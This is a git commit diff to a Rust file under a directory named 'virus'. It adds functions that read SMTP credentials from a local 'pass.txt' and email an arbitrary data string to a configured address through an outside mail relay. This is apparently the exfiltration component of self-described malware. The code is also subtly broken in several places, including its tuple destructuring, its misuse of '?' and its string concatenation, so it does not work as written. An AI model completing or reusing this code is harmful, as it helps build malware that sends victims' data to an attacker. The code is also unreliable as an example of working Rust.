87c3fb74e6cafe5e26e84486351fcaaa88ab8fa5
Octopus <66487668+J-P-S-O@users.noreply.github.com>
2021-12-09 11:49:22 -0300

    Add complete sendmail functions

--- virus/src/main.rs
+++ virus/src/main.rs
@@ -1,11 +1,45 @@
+use lettre::{
+    transport::smtp::authentication::Credentials, AsyncSmtpTransport, AsyncTransport, Message,
+    Tokio1Executor,
+};
+
 fn main() {
     println!("Hello, world!");
 }
-fn send(){
+fn send(data: String){
     let file = File::open("pass.txt").expect("file not found!");
     let reader = BufReader::new(file);
     let lines = reader.lines();
     
     let (user, password, email, provider, port) = lines;
+    let smtp_credentials = Credentials::new(user.to_string(), password.to_string());
+
+    let mailer = AsyncSmtpTransport::<Tokio1Executor>::relay(provider)?
+        .credentials(smtp_credentials)
+        .build();
+
+    let from = user+ " <"+email+">";
+    let to = user+ " <"+email+">";
+    let subject = "Hello World";
+    let body = data.to_string();
+
+    send_email_smtp(&mailer, from, to, subject, body)
     
+}
+
+fn send_email_smtp(
+    mailer: &AsyncSmtpTransport<Tokio1Executor>,
+    from: &str,
+    to: &str,
+    subject: &str,
+    body: String,
+){
+    let email = Message::builder()
+        .from(from.parse()?)
+        .to(to.parse()?)
+        .subject(subject)
+        .body(body.to_string())?;
+
+    mailer.send(email);
+
 }
